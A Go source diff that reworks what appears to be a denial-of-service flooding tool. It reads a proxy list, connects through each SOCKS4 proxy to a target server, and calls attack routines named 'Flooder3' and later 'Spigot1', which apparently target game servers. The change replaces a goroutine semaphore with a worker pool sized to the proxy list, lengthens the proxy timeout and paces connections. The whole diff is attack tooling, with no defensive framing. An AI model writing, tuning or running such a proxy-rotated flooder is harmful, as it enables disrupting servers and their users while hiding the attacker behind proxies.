@@ -9,6 +9,8 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
+	"time"
 
 	"h12.io/socks"
 )
@@ -61,7 +63,7 @@ func parseProxies() []string {
 }
 
 func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error) {
-	address := fmt.Sprintf("socks4://%s?timeout=2s", proxyAddress)
+	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)
 
 	dialSocks := socks.Dial(address)
 	conn, err := dialSocks("tcp", serverAddress)
@@ -69,28 +71,41 @@ func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error)
 	return conn, err
 }
 
+func processProxy(proxies chan string, wg *sync.WaitGroup, address string, data *methods.MethodData) {
+	for proxy := range proxies {
+		var conn, err = makeConnection(proxy, address)
+		if err != nil {
+			//fmt.Println(err)
+		} else {
+			methods.Spigot1(data, conn)
+		}
+	}
+
+	wg.Done()
+}
+
 func main() {
-	var serverAddress, threads, loop = checkArguments(os.Args[1:])
+	var serverAddress, threadCooldown, loop = checkArguments(os.Args[1:])
+
+	fmt.Println(threadCooldown)
 
 	proxies := parseProxies()
 	data := methods.MethodData{Address: serverAddress, Loop: loop}
 
-	// Guard is needed to limit goroutines
-	guard := make(chan struct{}, threads)
+	proxyChan := make(chan string)
+	wg := sync.WaitGroup{}
+
+	for t := 0; t < len(proxies); t++ {
+		wg.Add(1)
+		go processProxy(proxyChan, &wg, serverAddress, &data)
+	}
 
 	for _, proxy := range proxies {
-		guard <- struct{}{}
-		go func(proxy string, serverAddress string, data *methods.MethodData) {
-			var conn, err = makeConnection(proxy, serverAddress)
-
-			if err != nil {
-				//fmt.Println(err)
-				// remove proxy from file (maybe) and slice
-			} else {
-				methods.Flooder3(data, conn)
-			}
-
-			<-guard
-		}(proxy, serverAddress, &data)
+		proxyChan <- proxy
+		time.Sleep(1 * time.Millisecond)
 	}
+
+	close(proxyChan)
+
+	wg.Wait()
 }
